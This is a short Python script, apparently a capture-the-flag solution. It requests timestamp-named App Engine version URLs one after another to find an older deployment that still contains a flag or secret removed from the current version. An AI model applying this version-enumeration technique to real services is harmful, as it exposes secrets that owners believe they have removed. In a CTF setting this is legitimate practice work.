#!/usr/bin/env python3
import re
import datetime
import requests


comment = '<!-- Corgi fix: remove the secret -->'
flag_format = re.compile('CTF\{.+\}')


if __name__ == '__main__':
    date = datetime.datetime(2021, 2, 28, 13, 52)
    while True:
        date = date - datetime.timedelta(seconds=1)
        version_id = date.strftime('%Y%m%dt%H%M%S')
        url = f'https://{version_id}-dot-bustling-bay-304920.wl.r.appspot.com/'
        try:
            r = requests.get(url)
        except Exception as e:
            print('Error occurred while retrieving page: ', url)
            print(e)

        if (flag_format.search(r.text)) or (comment not in r.text):
            source = r.text
            print(f'Interesting results found at: {url}')
            if matches := flag_format.findall(r.text):
                for match in matches:
                    print(match)
            break

        # Sanity check to see where you're at
        if date.minute == 0:
            print(date)

        if date < datetime.datetime(2021, 2, 20):
            print('Too many failed attempts. Try modifying script.')
            break
